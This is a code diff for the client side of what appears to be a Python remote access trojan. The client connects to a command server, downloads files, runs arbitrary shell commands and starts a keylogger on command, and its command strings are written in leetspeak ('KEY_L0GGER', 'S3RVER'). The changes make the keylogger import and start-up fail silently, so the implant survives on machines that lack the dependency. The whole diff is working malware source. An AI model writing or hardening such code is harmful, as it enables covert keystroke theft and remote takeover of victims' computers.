@@ -2,8 +2,11 @@ import socket, subprocess, os, sys
 import random
 from threading import Thread
 from time import sleep
-from pynput import keyboard
-import pynput
+try: #If the user does not have this input, skip it
+    from pynput import keyboard
+    import pynput
+except:
+    pass
 
 SERVER_HOST = "127.0.0.1" #DEFAULT SERVER HOST
 SERVER_PORT = 8080 #DEFAULT SERVER PORT
@@ -143,13 +146,17 @@ while True:
             s.send("DOWNLOADING_FILE_FROM_S3RVER_COMPLETE".encode())
 
     elif command == "START_KEYL0GGER":
-        global keyLoggerAlive
-        keyLoggerAlive = True
-        keyLogThread = Thread(target=start_keylog)
-        keyLogThread.start()
-        if s.recv(BUFFER_SIZE).decode() == "KEY_L0GGER-END":
-            keyLoggerAlive = False
-            continue
+        try:
+            global keyLoggerAlive
+            keyLoggerAlive = True
+            keyLogThread = Thread(target=start_keylog)
+            keyLogThread.start()
+            if s.recv(BUFFER_SIZE).decode() == "KEY_L0GGER-END":
+                keyLoggerAlive = False
+                continue
+        except:
+            s.send("NO_DEPENDENCIES".encode())
+
 
     else: #if the user doesn't want to perform a special action, run the command and capture the output
         #if the command runs for longer than 5 seconds, timeout
